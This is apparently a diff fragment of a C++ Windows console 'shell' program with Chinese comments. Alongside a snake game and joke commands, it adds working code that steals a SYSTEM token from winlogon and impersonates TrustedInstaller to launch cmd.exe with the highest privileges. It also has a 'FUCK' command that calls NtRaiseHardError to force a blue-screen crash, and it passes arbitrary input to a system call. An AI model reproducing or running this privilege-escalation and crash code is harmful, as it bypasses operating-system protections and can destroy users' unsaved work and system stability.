+        DWORD trustedInstallerPid = WaitForTrustedInstallerService();
+        if (!trustedInstallerPid)
+        {
+            RevertToSelf();
+            CloseHandle(hSystemToken);
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        // 步骤4: 获取 TrustedInstaller 线程并模拟
+        DWORD trustedInstallerTid = GetFirstThreadId(trustedInstallerPid);
+        if (!trustedInstallerTid)
+        {
+            RevertToSelf();
+            CloseHandle(hSystemToken);
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        HANDLE hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, trustedInstallerTid);
+        if (!hThread || !NtImpersonateThread)
+        {
+            RevertToSelf();
+            CloseHandle(hSystemToken);
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        SECURITY_QUALITY_OF_SERVICE sqos = {0};
+        sqos.Length = sizeof(sqos);
+        sqos.ImpersonationLevel = SecurityImpersonation;
+
+        NTSTATUS status = NtImpersonateThread(GetCurrentThread(), hThread, &sqos);
+        if (status != 0)
+        {
+            CloseHandle(hThread);
+            RevertToSelf();
+            CloseHandle(hSystemToken);
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        // 步骤5: 获取并复制令牌
+        HANDLE hImpersonatedToken;
+        if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpersonatedToken))
+        {
+            CloseHandle(hThread);
+            RevertToSelf();
+            CloseHandle(hSystemToken);
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        HANDLE hDuplicatedToken;
+        if (!DuplicateTokenEx(hImpersonatedToken, MAXIMUM_ALLOWED, nullptr,
+                              SecurityImpersonation, TokenImpersonation, &hDuplicatedToken))
+        {
+            CloseHandle(hImpersonatedToken);
+            CloseHandle(hThread);
+            RevertToSelf();
+            CloseHandle(hSystemToken);
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        // 步骤6: 使用令牌创建进程
+        std::wstring commandLine = BuildCommandLine(applicationPath, arguments);
+
+        STARTUPINFOW si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        si.lpDesktop = L"Winsta0\\Default";
+
+        BOOL success = CreateProcessWithTokenW(
+            hDuplicatedToken,
+            LOGON_WITH_PROFILE,
+            applicationPath,                         // lpApplicationName
+            const_cast<LPWSTR>(commandLine.c_str()), // lpCommandLine
+            CREATE_UNICODE_ENVIRONMENT,
+            nullptr, // lpEnvironment
+            nullptr, // lpCurrentDirectory
+            &si,
+            &pi);
+
+        // 清理资源
+        if (success)
+        {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+
+        CloseHandle(hDuplicatedToken);
+        CloseHandle(hImpersonatedToken);
+        CloseHandle(hThread);
+        RevertToSelf();
+        CloseHandle(hSystemToken);
+        CloseHandle(hWinlogon);
+        CloseHandle(hToken);
+
+        return success;
+    }
+};
+void CreatTrTask()
+{
+    if (RunAsAdmin)
+    {
+        TrustedInstallerLauncher launcher;
+        if (launcher.LaunchAsTrustedInstaller(L"cmd.exe"))
+        {
+            print(L"成功以 TrustedInstaller 权限启动 cmd.exe");
+        }
+        else
+        {
+            print(L"启动失败");
+        }
+    }
+    else
+    {
+        TCHAR szPath[MAX_PATH];
+        GetModuleFileName(NULL, szPath, MAX_PATH);
+
+        print(L"創建提權進程中");
+
+        HINSTANCE result = ShellExecuteW(
+            NULL,
+            L"runas",  // 以管理員權限運行
+            szPath,
+            L"-ti",     // 傳遞 -ti 參數
+            NULL,
+            SW_HIDE);
+
+        if ((INT_PTR)result <= 32)
+        {
+            print(L"提權進程創建失敗，錯誤代碼: "+ (INT_PTR)result);
+        }
+    }
+}
+class BSoD
+{
+public:
+    void Run()
+    {
+        BOOLEAN bl;
+        ULONG Response;
+        RtlAdjustPrivilege(19, (1 + 1 == 2), (2 == 2 + 2), &bl);
+        if (rand() > 0 || rand() < 0 || 0 == 0)
+        {
+            for (int i = 0; i <= 0; i++)
+            {
+                NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
+            }
+        }
+    }
+};
+//=======================================
+// 贪吃蛇游戏核心类
+//=======================================
+
+class SnakeGame
+{
+public:
+    SnakeGame() : score(0), gameOver(false), dir(Direction::RIGHT)
+    {
+        srand(static_cast<unsigned int>(time(nullptr)));
+        InitGame();
+    }
+
+    void Run()
+    {
+        DWORD64 lastTick = GetTickCount64();
+        while (!gameOver)
+        {
+            DWORD64 start = GetTickCount64();
+
+            ProcessInput();
+            Update();
+            Render();
+
+            DWORD64 end = GetTickCount64();
+            DWORD64 elapsed = end - start;
+            if (elapsed < FRAME_DELAY_MS)
+                Sleep(FRAME_DELAY_MS - elapsed);
+        }
+        ShowGameOver();
+    }
+
+private:
+    enum class Direction
+    {
+        UP,
+        DOWN,
+        LEFT,
+        RIGHT
+    };
+
+    struct Position
+    {
+        int x, y;
+        Position(int x = 0, int y = 0) : x(x), y(y) {}
+        bool operator==(const Position &o) const { return x == o.x && y == o.y; }
+
+        struct Hash
+        {
+            size_t operator()(const Position &p) const
+            {
+                return hash<int>()(p.x) ^ (hash<int>()(p.y) << 1);
+            }
+        };
+    };
+
+    // 遊戲配置
+    static constexpr int MAP_WIDTH = 40;
+    static constexpr int MAP_HEIGHT = 20;
+    static constexpr int FRAME_DELAY_MS = 120;
+    static constexpr int INIT_LENGTH = 4;
+
+    // 遊戲狀態
+    deque<Position> snake;
+    unordered_set<Position, Position::Hash> snakePositions;
+    Position food;
+    int score;
+    bool gameOver;
+    Direction dir;
+    Direction nextDir;
+
+    // 雙緩衝
+    HANDLE hScreen[2];
+    int activeScreen;
+
+private:
+    void InitGame()
+    {
+        snake.clear();
+        snakePositions.clear();
+
+        int startX = MAP_WIDTH / 4;
+        int startY = MAP_HEIGHT / 2;
+        for (int i = 0; i < INIT_LENGTH; ++i)
+        {
+            Position s(startX + i, startY);
+            snake.push_back(s);
+            snakePositions.insert(s);
+        }
+
+        dir = nextDir = Direction::LEFT;
+        score = 0;
+        gameOver = false;
+
+        // 初始化雙緩衝
+        hScreen[0] = CreateConsoleScreenBuffer(GENERIC_READ | GENERIC_WRITE, 0, NULL, CONSOLE_TEXTMODE_BUFFER, NULL);
+        hScreen[1] = CreateConsoleScreenBuffer(GENERIC_READ | GENERIC_WRITE, 0, NULL, CONSOLE_TEXTMODE_BUFFER, NULL);
+        activeScreen = 0;
+
+        CONSOLE_CURSOR_INFO cursorInfo{1, FALSE};
+        SetConsoleCursorInfo(hScreen[0], &cursorInfo);
+        SetConsoleCursorInfo(hScreen[1], &cursorInfo);
+
+        GenerateFood();
+    }
+
+    void ProcessInput()
+    {
+        if (_kbhit())
+        {
+            int ch = _getch();
+            switch (ch)
+            {
+            case 72:
+                if (dir != Direction::DOWN)
+                    nextDir = Direction::UP;
+                break;
+            case 80:
+                if (dir != Direction::UP)
+                    nextDir = Direction::DOWN;
+                break;
+            case 75:
+                if (dir != Direction::RIGHT)
+                    nextDir = Direction::LEFT;
+                break;
+            case 77:
+                if (dir != Direction::LEFT)
+                    nextDir = Direction::RIGHT;
+                break;
+            case 27:
+            case 32:
+                gameOver = true;
+                break;
+            }
+        }
+    }
+
+    void Update()
+    {
+        dir = nextDir;
+        Position newHead = snake.front();
+        switch (dir)
+        {
+        case Direction::UP:
+            newHead.y--;
+            break;
+        case Direction::DOWN:
+            newHead.y++;
+            break;
+        case Direction::LEFT:
+            newHead.x--;
+            break;
+        case Direction::RIGHT:
+            newHead.x++;
+            break;
+        }
+
+        // 穿牆
+        if (newHead.x < 0)
+            newHead.x = MAP_WIDTH - 1;
+        if (newHead.x >= MAP_WIDTH)
+            newHead.x = 0;
+        if (newHead.y < 0)
+            newHead.y = MAP_HEIGHT - 1;
+        if (newHead.y >= MAP_HEIGHT)
+            newHead.y = 0;
+
+        if (snakePositions.find(newHead) != snakePositions.end())
+        {
+            gameOver = true;
+            return;
+        }
+
+        snake.push_front(newHead);
+        snakePositions.insert(newHead);
+
+        if (newHead == food)
+        {
+            score += 10;
+            GenerateFood();
+        }
+        else
+        {
+            Position tail = snake.back();
+            snake.pop_back();
+            snakePositions.erase(tail);
+        }
+    }
+
+    void GenerateFood()
+    {
+        do
+        {
+            food.x = rand() % MAP_WIDTH;
+            food.y = rand() % MAP_HEIGHT;
+        } while (snakePositions.find(food) != snakePositions.end());
+    }
+
+    void Render()
+    {
+        HANDLE hOut = hScreen[activeScreen];
+        DWORD written;
+        COORD coord{0, 0};
+        SetConsoleCursorPosition(hOut, coord);
+
+        // 使用寬字串緩衝重繪整個畫面
+        wstring buffer;
+        buffer.reserve((MAP_WIDTH + 3) * (MAP_HEIGHT + 5));
+
+        buffer += L'＋';
+        buffer.append(MAP_WIDTH, L'－');
+        buffer += L"＋\n";
+
+        for (int y = 0; y < MAP_HEIGHT; ++y)
+        {
+            buffer += L'｜';
+            for (int x = 0; x < MAP_WIDTH; ++x)
+            {
+                Position pos(x, y);
+                if (pos == food)
+                    buffer += L'＊';
+                else if (pos == snake.front())
+                    buffer += L'＠';
+                else if (snakePositions.find(pos) != snakePositions.end())
+                    buffer += L'Ｏ';
+                else
+                    buffer += L'　'; // 全形空白
+            }
+            buffer += L"｜\n";
+        }
+
+        buffer += L'＋';
+        buffer.append(MAP_WIDTH, L'－');
+        buffer += L"＋\n";
+
+        buffer += L"Score: " + std::to_wstring(score) + L"\n";
+        buffer += L"Controls: Arrow keys to move, Space/Esc to quit\n";
+
+        // 寬字輸出
+        WriteConsoleW(hOut, buffer.c_str(), (DWORD)buffer.size(), &written, NULL);
+
+        // 顯示當前緩衝區
+        SetConsoleActiveScreenBuffer(hOut);
+
+        // 切換緩衝區
+        activeScreen = 1 - activeScreen;
+    }
+
+    void ShowGameOver()
+    {
+        HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+        SetConsoleActiveScreenBuffer(hOut);
+        system("cls");
+        print("\n\n   GAME OVER!");
+        print("   Final Score: " + score);
+        print("   Press any key to exit...");
+        _getch();
+    }
+};
+
+//=======================================
+// 命令行界面（保持不变）
+//=======================================
+class CommandShell
+{
+public:
+    void Run()
+    {
+        SetConsoleEncoding();
+        while (true)
+        {
+            ShowPrompt("C++");
+            ProcessCommand(GetInput());
+        }
+    }
+
+private:
+    void SetConsoleEncoding()
+    {
+        _setmode(_fileno(stdout), _O_U16TEXT);
+        _setmode(_fileno(stdin), _O_U16TEXT);
+    }
+
+    void ShowPrompt(const string& who) {
+        wcout << StringToWString(who) << L">";
+    }
+    void ShowPrompt(const wstring& who) {
+        wcout << who << L">";
+    }
+
+    wstring GetInput(){
+        wstring input;
+        getline(wcin, input);
+        return input;
+    }
+
+    void ProcessCommand(const wstring &cmd)
+    {
+        wstring upperCmd = ToUpper(cmd);
+
+        if (upperCmd == _T("EXIT"))
+        {
+            exit(0);
+        }
+        else if (upperCmd == _T("SNAKE"))
+        {
+            LaunchSnakeGame();
+        }
+        else if (upperCmd == _T("FUCK"))
+        {
+            FUCKmyPC();
+        }
+        //else if (upperCmd == _T("RUNNING"))
+        //{
+        //     running();
+        // }
+        else if (upperCmd == _T("VBS"))
+        {
+            VBS();
+        } /*else if (upperCmd == "RICK"||upperCmd == "RICKROLL")
+         {
+             VBS();
+         }*/
+        else if (upperCmd == _T("ADMIN"))
+        {
+            TrustedInstaller();
+        }
+        else if (!cmd.empty())
+        {
+            wstring MAINAPP = split_string(cmd)[0];
+            wstring TOUPMAINAPP = ToUpper(MAINAPP);
+            if (TOUPMAINAPP == _T("UNINSTALL"))
+            {
+                if (split_string(cmd).size() == 2 && ToUpper(split_string(cmd)[1]) == ToUpper(L"Miku_Hatsune"))
+                {
+                    MIKU();
+                }
+                else
+                {
+                    print("*****************");
+                    print("*      list     *");
+                    print("*****************");
+                    print("Miku_Hatsune 3GiB");
+                    print("*****************");
+                };
+            }
+            else
+            {
+                sysetm(cmd.c_str());
+            };
+        }
+    }
+
+    wstring ToUpper(wstring str)
+    {
+        if (str.empty())
+        {
+            return L""; // 空输入处理
+        }
+        transform(str.begin(), str.end(), str.begin(), ::toupper);
+        return str;
+    }
+
+    void LaunchSnakeGame()
+    {
+        ClearScreen();
+        SnakeGame game;
+        game.Run();
+        ClearScreen();
+    }
+    void MIKU()
+    {
+        for (const auto &verse : MIKU_CORE)
+        {
+            print(verse.c_str());
+            Sleep(30);
+        }
+        Sleep(1000);
+        print(MIKU_ASCII);
+    }
+    void FUCKmyPC()
+    {
+        print(FUCK_ASCII);
+        BSoD XD;
+        XD.Run();
+        ClearScreen();
+    }
+    void running()
+    {
+    }
+    void Rick()
+    {
+    }
+    void VBS()
+    {
+        print("================================================");
+        print("      Please Enter \"`\" to Run your program.     ");
+        print("================================================");
+        wstring the_final_code, the_input_code, zero_string;
+        wstring input;
+        while (true)
+        {
+
+            ShowPrompt("Vbs");
+            input = GetInput();
+            if (input == _T("`"))
+            {
+                vbs(the_final_code);
+                the_final_code = zero_string;
+            }
+            else if (ToUpper(input) == _T("EXIT"))
+            {
+                return;
+            }
+            else
+            {
+                the_final_code = the_final_code + input;
+            }
+        }
+    }
+    void TrustedInstaller()
+    {
+        CreatTrTask();
+    }
+};
+
+//===========
+// 主程序入口
+//===========
+
+int main(int argc, char *argv[])
+{
+    SetConsoleWindowVisibility(false);
+    // 解析命令行参数
+    RunAsAdmin = IsRunningAsAdmin();
+    for (int i = 1; i < argc; i++)
+    {
+        string arg = argv[i];
+        if (arg == "-ti" || arg == "--ti" || arg == "/ti")
+        {
+            TrAutoRun = true;
+        }
+    }
+
+    // 初始化随机数种子
+    srand(static_cast<unsigned>(time(nullptr)));
+
+    if (!TrAutoRun)
+    {
+        SetConsoleWindowVisibility(true);
+        srand(static_cast<unsigned>(time(nullptr)));
+        CommandShell shell;
+        wcout << L"C++ Shell v1.0.0" << endl;
+        shell.Run();
+    }
+    else
+    {
+        if (TrAutoRun)
+        {
+            if (RunAsAdmin)
+            {
+
+                TrustedInstallerLauncher launcher;
+                // 启动 cmd.exe
+                if (launcher.LaunchAsTrustedInstaller(L"cmd.exe"))
+                {
+                    print(L"成功以 TrustedInstaller 权限启动 cmd.exe");
+                }
+                else
+                {
+                    print(L"启动失败");
+                }
+            }
+            else
+            {
+
+                SetConsoleWindowVisibility(true);
+                print(L"不給權限我提個雞毛啊");
+                system("pause");
+                return -1;
+            }
+        }
+    }
+
+    return 0;
+}
